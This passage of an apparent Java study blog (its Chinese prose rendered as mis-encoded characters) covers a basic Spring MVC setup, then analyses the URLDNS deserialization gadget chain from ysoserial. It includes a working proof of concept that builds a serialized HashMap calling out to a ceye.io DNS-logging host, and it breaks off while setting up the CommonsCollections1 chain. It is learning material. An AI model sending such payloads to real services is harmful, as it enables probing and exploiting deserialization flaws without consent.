¹æœ¬æ²¡æœ‰å†™å‡ºmvcçš„ä½œç”¨,æœ‰çš„æ–¹æ³•å®Œå…¨æ‹˜æ³¥äºåŸæ¥servletçš„å†™æ³•,æ²¡æœ‰ç”¨ä¸Šspringè‡ªå·±çš„ä¾èµ–ã€‚æœ€åæ‰¾åˆ°ä¸€ä¸ªé˜¿é‡Œäº‘çš„demoæ‰çœŸæ­£ç†è§£äº†å…¶ç»“æ„ã€‚ä¸‹é¢æ¥å®é™…æ“ä½œä¸‹ã€‚</p><p>é¦–å…ˆideaåˆ›å»ºspringmvcé¡¹ç›®ã€‚å½“ç„¶åˆšåˆšæåˆ°äº†åˆ›å»ºmavené¡¹ç›®ç„¶åå¼•å…¥springä¾èµ–ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚è¿™é‡Œæˆ‘ä»¬å°±æš‚ä¸”å…ˆä½¿ç”¨ideaæ¥å¸®åŠ©æˆ‘ä»¬ç›´æ¥å¤„ç†å¥½springçš„ä¾èµ–å§ã€‚</p><p>åˆšåˆ›å»ºå®Œé¡¹ç›®é¦–å…ˆè¦æ³¨æ„ä¸€ç‚¹ã€‚éœ€è¦åœ¨ProjectStructure =&gt; Artifact ä¸­å°†ä¸¤ä¸ªspringçš„ä¾èµ–åŠ å…¥åˆ°WEB-INF/libä¸­ã€‚å¦åˆ™å¾…ä¼šæˆ‘ä»¬ä½¿ç”¨tomcatéƒ¨ç½²æ—¶ä¼šæŠ¥é”™ã€‚<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/28.PNG" class="lazyload" data-srcset="28.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ¥ä¸‹æ¥å…ˆç”¨ä¸åŠ æ³¨è§£çš„æ–¹æ³•å†™ä¸€ä¸ªclassã€‚</p><pre><code class="java">package top.bycsec;import org.springframework.web.servlet.ModelAndView;import org.springframework.web.servlet.mvc.Controller;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;public class Helloworld implements Controller {    @Override    public ModelAndView handleRequest(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) throws Exception {        ModelAndView modelAndView = new ModelAndView();        modelAndView.addObject(&quot;name&quot;,&quot;byc_404&quot;);        modelAndView.setViewName(&quot;hello&quot;);        return modelAndView;    }}</code></pre><p>åº•ä¸‹addObjectæ˜¯åŠ è½½æ¨¡å‹æ•°æ®ã€‚setViewNameåˆ™æ˜¯é€‰å®šæ¨¡å‹è§†å›¾ã€‚è¿™é‡Œè§†å›¾ä¸ä½¿ç”¨hello.jspè€Œæ˜¯helloæ˜¯æ–¹ä¾¿ä¹¦å†™ã€‚æˆ‘ä»¬åé¢ç›´æ¥åœ¨é…ç½®ä¸­å®šä¹‰åç¼€å³å¯ã€‚</p><pre><code class="java">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%@ page isELIgnored=&quot;false&quot; %&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Hello World&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Hello ${name}&lt;/body&gt;&lt;/html&gt;</code></pre><p>hello.jsp ä½¿ç”¨SpELè¡¨è¾¾å¼ã€‚å³è·å–æˆ‘ä»¬åˆšåˆšçš„æ¨¡å‹æ•°æ®è¾“å‡ºåˆ°è§†å›¾ã€‚<br>ç„¶åæ˜¯é¡¹ç›®åˆ›å»ºæ—¶è‡ªåŠ¨ç”Ÿæˆçš„dispatcher-servlet.xmlã€‚è¿™é‡Œå¯ä»¥ä¿®æ”¹æˆ‘ä»¬beançš„ç›¸å…³å‚æ•°ã€‚æ¯”å¦‚æ­¤å¤„è®¾ç½®è·¯ç”±<code>/helloworld</code>ã€‚åˆ©ç”¨beanidè®©å…¶å¯¹åº”classä¸ºHelloWorld.ä»¥åŠè§†å›¾æ˜¯åœ¨webæ ¹ç›®å½•ä¸‹æ‰¾åç¼€ä¸ºjspçš„æ–‡ä»¶ã€‚<br>é…ç½®æ–‡ä»¶beanéƒ¨åˆ†å¦‚ä¸‹ã€‚</p><pre><code class="xml">&lt;bean id=&quot;handlerMapping&quot; class=&quot;org.springframework.web.servlet.handler.SimpleUrlHandlerMapping&quot;&gt;        &lt;property name=&quot;mappings&quot;&gt;            &lt;props&gt;                &lt;prop key=&quot;/helloworld&quot;&gt;testHandler&lt;/prop&gt;            &lt;/props&gt;        &lt;/property&gt;    &lt;/bean&gt;    &lt;bean id=&quot;testHandler&quot; class=&quot;top.bycsec.Helloworld&quot;&gt;&lt;/bean&gt;    &lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;        &lt;property name=&quot;prefix&quot;&gt;            &lt;value&gt;/&lt;/value&gt;        &lt;/property&gt;        &lt;property name=&quot;suffix&quot;&gt;            &lt;value&gt;.jsp&lt;/value&gt;        &lt;/property&gt;    &lt;/bean&gt;</code></pre><p>ä¹‹ååŠ è½½tomcaté…ç½®è·‘èµ·æ¥å³å¯ã€‚è®¿é—®æ ¹ç›®å½•æ˜¯index.jspå†…å®¹ã€‚è®¿é—®<code>/helloworld</code>åˆ™æ˜¯hello.jsp<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/29.PNG" class="lazyload" data-srcset="29.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å½“ç„¶ã€‚è¿™ç§å†™æ³•è‚¯å®šæ˜¯éº»çƒ¦äº†ã€‚åˆšå¥½æ˜¨å¤©å­¦è¿‡äº†spring ä¸­è‡ªåŠ¨è£…è½½beançš„ç”¨æ³•ã€‚é‚£ä¹ˆæ­¤å¤„å½“ç„¶ä¹Ÿå¯ä»¥åˆ©ç”¨æ³¨è§£+é…ç½®è‡ªåŠ¨è£…è½½bean</p><p>æ–°å†™ä¸€ä¸ªAnnotationHandlerç±»ã€‚è¿™é‡Œä½¿ç”¨æ³¨è§£<code>@Controller</code>å°†å…¶ç½®ä¸ºæ§åˆ¶å™¨ã€‚åŒæ—¶è®¾å®šå…¶è·¯ç”±ä¸º<code>/mdoel</code>ã€‚æ•°æ®ä¸è§†å›¾è·Ÿåˆšåˆšå·®ä¸å¤šã€‚</p><pre><code class="java">package top.bycsec;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.servlet.ModelAndView;@Controllerpublic class AnnotationHandler {    @RequestMapping(&quot;/model&quot;)    public ModelAndView  modelAndViewTest(){        ModelAndView modelAndView = new ModelAndView();        modelAndView.addObject(&quot;name&quot;,&quot;byc_404&quot;);        modelAndView.setViewName(&quot;show&quot;);        return modelAndView;    }}</code></pre><p>show.jsp</p><pre><code class="java">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;%@ page isELIgnored=&quot;false&quot; %&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;Model&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Testing model by ${name}&lt;/body&gt;&lt;/html&gt;</code></pre><p>dispatcher-servlet.xml</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd&quot;&gt;    &lt;context:component-scan base-package=&quot;top.bycsec&quot;&gt;&lt;/context:component-scan&gt;    &lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;        &lt;property name=&quot;prefix&quot;&gt;            &lt;value&gt;/&lt;/value&gt;        &lt;/property&gt;        &lt;property name=&quot;suffix&quot;&gt;            &lt;value&gt;.jsp&lt;/value&gt;        &lt;/property&gt;    &lt;/bean&gt;&lt;/beans&gt;</code></pre><p>ç›´æ¥æ‰«ætop.bycsecåŒ…ååˆ†æ–¹ä¾¿ã€‚ç°åœ¨æˆ‘ä»¬è®¿é—®<code>/model</code>è·¯ç”±<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/30.PNG" class="lazyload" data-srcset="30.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æœ€ç»ˆé¡¹ç›®è·¯å¾„<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/31.PNG" class="lazyload" data-srcset="31.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å¦‚æœè¦åœ¨ä¸Šé¢åŸºç¡€ä¸Šæ¥å—å‚æ•°æˆ–è€…è®¾ç½®è·¯ç”±åŸºæœ¬è·Ÿservletå·®ä¸å¤š</p><pre><code class="java">@Controller@RequestMapping(&quot;/user&quot;)public class UserController {    // å®é™…URLæ˜ å°„æ˜¯/user/profile    @GetMapping(&quot;/profile&quot;)    public ModelAndView profile() {        ...    }    // å®é™…URLæ˜ å°„æ˜¯/user/changePassword    @GetMapping(&quot;/changePassword&quot;)    public ModelAndView changePassword() {        ...    }    @PostMapping(&quot;/signin&quot;)    public ModelAndView doSignin(        @RequestParam(&quot;email&quot;) String email,        @RequestParam(&quot;password&quot;) String password,        HttpSession session) {    ...    }}</code></pre><p>å‡å¦‚ç¼–å†™çš„æ˜¯å¤§é‡æ¥å£çš„ä»£ç (rest api)ã€‚springè¿˜æä¾›äº†<code>@RestController</code>æ¥ä»£æ›¿<code>@Controller</code>.è¿™æ ·æ¥å£çš„æ–¹æ³•è‡ªåŠ¨å˜æˆapiæ–¹æ³•ã€‚æ•°æ®ä¹Ÿæ˜¯restapiçš„jsonæ•°æ®ã€‚</p><h2 id="Audit"><a href="#Audit" class="headerlink" title="Audit"></a>Audit</h2><p>è¿™ä¸€éƒ¨åˆ†ç”¨äºå­¦ä¹ javaä»£ç å®¡è®¡ä¸­ä¸€äº›å¸¸è§æ¼æ´çš„æ·±å±‚åŸç†ã€‚æ¯”å¦‚ä¹‹å‰ååºåˆ—åŒ–ä¸­åˆ©ç”¨é“¾çš„æ·±å±‚åŸå› è¿˜æ²¡æœ‰å…¨éƒ¨å­¦æ¸…æ¥šã€‚ä¸€äº›ç‰¹å®šæƒ…å†µä¸‹çš„payloadç¼–å†™ä¹Ÿè¿˜éœ€è¦åŸºç¡€çŸ¥è¯†ä½œä¸ºåº•å±‚æ”¯æŒã€‚</p><p>çœŸæ­£æ¥è§¦äº†å®æˆ˜æ‰ä¼šå‘ç°javaåœ¨ç°åœ¨ä»æ—§æ˜¯å»ºç«™çš„é¦–é€‰ï¼Œå¹¶ä¸”å¾€å¾€å¯ä»¥æ‹¿åˆ°æƒé™è¾ƒé«˜çš„shell.ä¹Ÿå¹¸å¥½æœ€è¿‘æ¥è§¦javaç›¸å¯¹æ›´å¤šäº†ç‚¹ï¼Œæ‰€ä»¥æ‰æœ‰èƒ†é‡å»æ¢ç©¶è¿™äº›æ¼æ´åˆ©ç”¨çš„åº•å±‚ã€‚</p><h3 id="deserialization-gadgets"><a href="#deserialization-gadgets" class="headerlink" title="deserialization gadgets"></a>deserialization gadgets</h3><p>å…ˆä»ysoserialpayloadåˆ©ç”¨é“¾çš„åŸç†å¼€å§‹å®¡è®¡ã€‚</p><p>æ ¹æ®æˆ‘ä»¬æœ€æ—©å­¦ä¹ åˆ°çš„javaååºåˆ—åŒ–åŸç†ã€‚æˆ‘ä»¬çŸ¥é“,åºåˆ—åŒ–åˆ©ç”¨ç±»å¿…é¡»æ˜¯å®ç°äº†Serializableçš„ã€‚è¿™äº›éƒ½æ˜¯payloadå¯è¡Œçš„å¿…è¦æ¡ä»¶ã€‚æ‰€ä»¥åç»­è¿™ç§ç»†èŠ‚éƒ½ä¸å¿…æã€‚</p><ul><li>URLDNS</li></ul><p>URLDNSå¸¸ç”¨äºæ£€æµ‹ååºåˆ—åŒ–æ¼æ´ã€‚åŸå› å¾ˆç®€å•:<br>1.ä¾èµ–åŸç”Ÿç±»Hashmap<br>2.ä¸ä¾èµ–jdkç‰ˆæœ¬</p><p>æˆ‘ä»¬çœ‹çœ‹Hashmapç±»ã€‚å®ƒå®ç°äº†readObjectæ–¹æ³•</p><pre><code class="java">private void readObject(java.io.ObjectInputStream s)    throws IOException, ClassNotFoundException {    // Read in the threshold (ignored), loadfactor, and any hidden stuff    s.defaultReadObject();    reinitialize();    if (loadFactor &lt;= 0 || Float.isNaN(loadFactor))        throw new InvalidObjectException(&quot;Illegal load factor: &quot; +                                            loadFactor);    s.readInt();                // Read and ignore number of buckets    int mappings = s.readInt(); // Read number of mappings (size)    if (mappings &lt; 0)        throw new InvalidObjectException(&quot;Illegal mappings count: &quot; +                                            mappings);    else if (mappings &gt; 0) { // (if zero, use defaults)        // Size the table using given load factor only if within        // range of 0.25...4.0        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);        float fc = (float)mappings / lf + 1.0f;        int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?                    DEFAULT_INITIAL_CAPACITY :                    (fc &gt;= MAXIMUM_CAPACITY) ?                    MAXIMUM_CAPACITY :                    tableSizeFor((int)fc));        float ft = (float)cap * lf;        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?                        (int)ft : Integer.MAX_VALUE);        // Check Map.Entry[].class since it&#39;s the nearest public type to        // what we&#39;re actually creating.        SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);        @SuppressWarnings({&quot;rawtypes&quot;,&quot;unchecked&quot;})        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap];        table = tab;        // Read the keys and values, and put the mappings in the HashMap        for (int i = 0; i &lt; mappings; i++) {            @SuppressWarnings(&quot;unchecked&quot;)                K key = (K) s.readObject();            @SuppressWarnings(&quot;unchecked&quot;)                V value = (V) s.readObject();            putVal(hash(key), key, value, false, false);        }    }}</code></pre><p>å…³é”®åœ¨æœ€åä¸€è¡Œçš„putvalã€‚æˆ‘ä»¬å…ˆçœ‹å‘putvalä¸­ä½¿ç”¨äº†çš„hashæ–¹æ³•<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/32.PNG" class="lazyload" data-srcset="32.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>é‡Œé¢hashCodeæ–¹æ³•å–å†³äºä½ çš„keyçš„ç±»ã€‚æ­¤å¤„æ˜¯java.net.URLç±»ã€‚</p><pre><code class="java">public synchronized int hashCode() {    if (hashCode != -1)        return hashCode;    hashCode = handler.hashCode(this);    return hashCode;}</code></pre><p>è€Œè·Ÿè¿›è¿™é‡Œçš„handlerå‘ç°è°ƒç”¨çš„æ˜¯java.net.URLStreamHandlerçš„hashCodeã€‚<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/33.PNG" class="lazyload" data-srcset="33.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>çœ‹åˆ°<code>getHostAddress</code>.å°±èƒ½æ˜ç™½æ­¤å¤„è‚¯å®šæ˜¯å¯¹åŸŸåè¿›è¡Œäº†è§£æã€‚æ‰€ä»¥ä¼šå‘å‡ºDNSè¯·æ±‚ã€‚</p><p>ä¸è¿‡ã€‚URLDNSçš„payloadç¼–å†™å¹¶éè¿™ä¹ˆç®€å•çš„ä¸€ä¸ªè°ƒç”¨å°±å®Œäº‹äº†çš„ã€‚åˆšåˆšä¸Šé¢æˆ‘ä»¬çœ‹åˆ°ã€‚<code>hashCode</code>æ–¹æ³•é‡Œå¼ºè°ƒå¦‚æœhashCodeä¸ä¸º-1,åˆ™ç›´æ¥è¿”å›hashCode.è€Œurlç±»ä¸­å®ƒæ˜¯é»˜è®¤ä¸º-1çš„ã€‚<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/34.PNG" class="lazyload" data-srcset="34.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>åˆšåˆšæˆ‘ä»¬è¯´ï¼Œè§¦å‘ç‚¹åœ¨<code>putVal</code>é‚£é‡Œã€‚å®ƒçš„keyæ˜¯é€šè¿‡readObjectè¯»å–å‡ºæ¥çš„ã€‚é‚£è¯´æ˜æˆ‘ä»¬çš„keyå†™å…¥æ—¶æ˜¯é€šè¿‡writeObjectå†™å…¥çš„ã€‚æŒ‰ç…§è¿™ä¸ªçº¿è·¯è·Ÿä¸‹å»,ä¼šå‘ç°keyå€¼æœ€ç»ˆæ¥è‡ªHashMapä¸­tableçš„å€¼ã€‚è€ŒHashMap ä¸­çš„tableå³hashè¡¨æ˜¯é€šè¿‡hashmap.putæ¥å†™å…¥æ•°æ®çš„ã€‚</p><pre><code class="java">public V put(K key, V value) {    return putVal(hash(key), key, value, false, true);}</code></pre><p>è¿™é‡Œä¹Ÿè°ƒç”¨äº†hashã€‚é‚£ä¹ˆè¯´æ˜è¿™é‡Œä¹Ÿä¼šè§¦å‘dnsè¯·æ±‚</p><p>æˆ‘ä»¬å¯ä»¥å†™ä¸ªdemo<br>URLDNSçš„payloadç¼–å†™å¹¶éè¿™ä¹ˆç®€å•çš„ä¸€ä¸ªè°ƒç”¨å°±å®Œäº‹äº†çš„ã€‚åˆšåˆšä¸Šé¢æˆ‘ä»¬çœ‹åˆ°ã€‚<code>hashCode</code>æ–¹æ³•é‡Œå¼ºè°ƒå¦‚æœhashCodeä¸ä¸º-1,åˆ™ç›´æ¥è¿”å›hashCode.<br>æ‰€ä»¥æœ¬åœ°å†™è¦å°†putçš„ç¬¬äºŒä¸ªå‚æ•°è®¾ä¸º-1æ‰ä¼šå‘å‡ºdnsè¯·æ±‚ã€‚</p><pre><code class="java">package top.bycsec;import java.util.HashMap;import java.net.URL;public class exp {    public static void main(String[] args) throws Exception {        HashMap map = new HashMap();        URL url = new URL(&quot;http://byc.xxx.ceye.io/&quot;);        map.put(url,-1);     }}</code></pre><p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/35.PNG" class="lazyload" data-srcset="35.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æˆ‘ä»¬å¦‚æœåªæƒ³åœ¨å¯¹æ–¹æœºå™¨ä¸Šæ£€æµ‹æ˜¯å¦äº§ç”Ÿdnsè¯·æ±‚ã€‚é‚£ä¹ˆå¿…é¡»å¾—è§„é¿æ‰Hashmap.putè¿™ä¸€æ¬¡è°ƒç”¨æ—¶é‡Œé¢åšå‡ºçš„dnsè¯·æ±‚ã€‚æ–¹æ³•ä¹Ÿå¾ˆç®€å•ã€‚é‚£å°±æ˜¯åœ¨putå‰ä¿®æ”¹URLçš„hashCodeä¸ºå…¶ä»–ä»»æ„å€¼ï¼Œå°±å¯ä»¥åœ¨putæ—¶ä¸è§¦å‘dnsæŸ¥è¯¢</p><p>è¿™ä¸€æ­¥å¯ä»¥é€šè¿‡åå°„æ¥è¾¾æˆã€‚</p><pre><code class="java">import java.lang.reflect.Field;import java.util.HashMap;import java.net.URL;public class exp {    public static void main(String[] args) throws Exception {        HashMap map = new HashMap();        URL url = new URL(&quot;http://byc.59fevd.ceye.io/&quot;);        Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);        f.setAccessible(true);        f.set(url,123);        System.out.println(url.hashCode());        map.put(url,123);    }}</code></pre><p>æ­¤æ—¶è°ƒç”¨urlçš„hashCodeç»“æœä¼šè¿”å›123.ä¹Ÿå°±æ˜¯ç›´æ¥è¿”å›äº†æˆ‘ä»¬è®¾ç½®çš„å€¼,é¿å…äº†dnsæŸ¥è¯¢ã€‚</p><p>hashCode è¿™ä¸ªå±æ€§ä¸æ˜¯ transient çš„,è€Œæ˜¯privateçš„ã€‚æ‰€ä»¥æ”¾è¿›å»åè®¾å› -1, è¿™æ ·åœ¨ååºåˆ—åŒ–æ—¶å°±ä¼šé‡æ–°è®¡ç®— hashCode</p><p>å› æ­¤ã€‚æˆ‘ä»¬å®é™…çš„pocå¦‚ä¸‹</p><pre><code class="java">package top.bycsec;import java.io.FileOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.net.URL;import java.util.HashMap;public class URLDNS {    public static void main(String[] args) throws Exception {        HashMap map = new HashMap();        URL url = new URL(&quot;http://byc.59fevd.ceye.io/&quot;);        Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);        f.setAccessible(true);        f.set(url, 123);        map.put(url, &quot;byc_404&quot;);        f.set(url, -1);        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;));        oos.writeObject(map);        oos.close();    }}</code></pre><p>è¿™æ ·å°±æˆåŠŸå°†åºåˆ—åŒ–æ•°æ®å†™å…¥out.bin,å¹¶ä¸”æ²¡æœ‰æœ¬åœ°å‘å‡ºdnsè¯·æ±‚ã€‚ç„¶åæˆ‘ä»¬æ¨¡æ‹ŸçœŸå®åœºæ™¯è§¦å‘</p><pre><code class="java">package top.bycsec;import java.io.FileInputStream;import java.io.ObjectInputStream;public class exp {    public static void main(String[] args) throws Exception {        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;));        ois.readObject();        ois.close();    }}</code></pre><p>åœ¨p1g3å¸ˆå‚…çš„æ–‡ç« é‡Œè¿˜å¯¹ysoserialçš„payloadè¿›è¡Œäº†åˆ†æã€‚æˆ‘ä»¬ä¸å¦¨ä¹Ÿçœ‹çœ‹ysoçš„jaråŒ…ä¸­æ˜¯å¦‚ä½•ä¹¦å†™çš„(å…¶å®ç›´æ¥å»çœ‹githubä¸Šæºç å¯ä»¥é…åˆæ³¨é‡Šæ›´å¥½é˜…è¯»)</p><pre><code class="java">public Object getObject(String url) throws Exception {    URLStreamHandler handler = new URLDNS.SilentURLStreamHandler();    HashMap ht = new HashMap();    URL u = new URL((URL)null, url, handler);    ht.put(u, url);    Reflections.setFieldValue(u, &quot;hashCode&quot;, -1);    return ht;}static class SilentURLStreamHandler extends URLStreamHandler {    SilentURLStreamHandler() {    }    protected URLConnection openConnection(URL u) throws IOException {        return null;    }    protected synchronized InetAddress getHostAddress(URL u) {        return null;    }}</code></pre><p>jaråŒ…åç¼–è¯‘çœ‹ä¸å‡ºæç¤ºã€‚æˆ‘ä»¬åœ¨githubæºç ä¸Šåˆ™å¯ä»¥æ‰¾åˆ°ä½œè€…çš„è¯´æ³•</p><pre><code class="java">//Avoid DNS resolution during payload creation                //Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.URLStreamHandler handler = new SilentURLStreamHandler();</code></pre><p>é…åˆä¸Šé¢çš„æºç ã€‚æˆ‘ä»¬çŸ¥é“è¿™é‡Œå®ƒæ–°å»ºäº†ä¸€ä¸ªå­ç±»SilentURLStreamHandlerç»§æ‰¿URLStreamHandlerã€‚é‚£å½“å®ƒåœ¨URLDNSpayloadé‡Œè°ƒç”¨putæ—¶æ˜¯ç›´æ¥è°ƒç”¨è‡ªå®šä¹‰çš„<code>getHostAddress</code>.è¿™ä¸ªæ–¹æ³•è¿”å›null.</p><p>è€Œå½“ååºåˆ—åŒ–æ‰§è¡Œæ—¶,å› ä¸ºè¿™é‡Œçš„SilentURLStreamHandlerå±æ€§è¢«è®¾ç½®ä¸ºtransientï¼Œ<strong>è€Œè¢«transientä¿®é¥°çš„å˜é‡æ— æ³•è¢«åºåˆ—åŒ–</strong>ï¼Œæ‰€ä»¥æœ€ç»ˆååºåˆ—åŒ–è¯»å–å‡ºæ¥çš„transientä¾æ—§æ˜¯å…¶åˆå§‹å€¼ï¼Œä¹Ÿå°±æ˜¯URLStreamHandlerã€‚</p><p>åˆ°æ­¤ä¸ºæ­¢ã€‚æˆ‘ä»¬å®Œæˆäº†æ•´æ¡urldnsé“¾çš„åˆ†æã€‚<br>gadgetså¦‚ä¸‹</p><pre><code>HashMap#readObject    HashMap#hash        URL#hashCode        URLStreamHandler#hashCode        URLStreamHandler#getHostAddress</code></pre><ul><li>CommonCollections1</li></ul><p>å…ˆè¯´ä¸‹ç¯å¢ƒçš„é…ç½®é—®é¢˜ã€‚å› ä¸ºccé“¾å­å¥½å‡ æ¡éƒ½åªèƒ½ç”¨åœ¨jdk1.7ä¸‹äº†æ‰€ä»¥å¾—å¼„ä¸ªjdk1.7çš„ç¯å¢ƒã€‚å¼€å§‹æ‰“ç®—ç”¨kaliè™šæ‹Ÿæœºç°æˆçš„çš„jvmé‡Œçš„1.7,ç»“æœå› ä¸ºå®˜æ–¹åº“å·²ç»æ²¡æœ‰openjdk7äº†ï¼Œideaè¯†åˆ«ä¸åˆ°ã€‚æ‰€ä»¥åªå¥½åˆä¸‹äº†ä¸€ä¸ªjdk1.7.</p><p>å› ä¸ºåªæ˜¯é¡¹ç›®ç”¨ï¼Œæ‰€ä»¥ä¸éœ€è¦æ·»åŠ ç¯å¢ƒå˜é‡ä»€ä¹ˆçš„å°±å¯ä»¥äº†ã€‚ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ideaé¡¹ç›®åˆ‡æ¢jdkç‰ˆæœ¬çš„è¯,å°¤å…¶å¯¹äºæˆ‘ä»¬mavené¡¹ç›®è€Œè¨€,ä¸€å®šè¦æŠŠè®¾ç½®é‡Œæ‰€æœ‰é»˜è®¤å€¼éƒ½æ”¹ä¸ºjdk1.7.åŒ…æ‹¬ï¼špom.xmlé‡Œjava versionä¸maven ç¼–è¯‘version;project structureé‡Œproject sdk ä»¥åŠmodules;Language level;java Compiler version å…¨éƒ¨è°ƒæ•´ä¸º1.7æ‰èƒ½ä¸å‡ºé”™ã€‚<br>å¦åˆ™ä¼šåœ¨ç¼–è¯‘æ—¶æŠ¥<code>æ— æ•ˆçš„æº</code>ä»¥åŠç¼–è¯‘å®Œå<code>æ— æ•ˆçš„ç›®æ ‡å‘è¡Œç‰ˆ</code>è¿™ä¸¤ç§é”™ã€‚<br>ä¿®æ”¹å¥½åå°±æ²¡æœ‰ä»€ä¹ˆå¥½æ‹…å¿ƒçš„äº†ã€‚å¼€å§‹mavenå¯¼åº“å®¡è®¡å§ã€‚<br>pom.xml</p><pre><code class="xml">&lt;properties&gt;        &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;        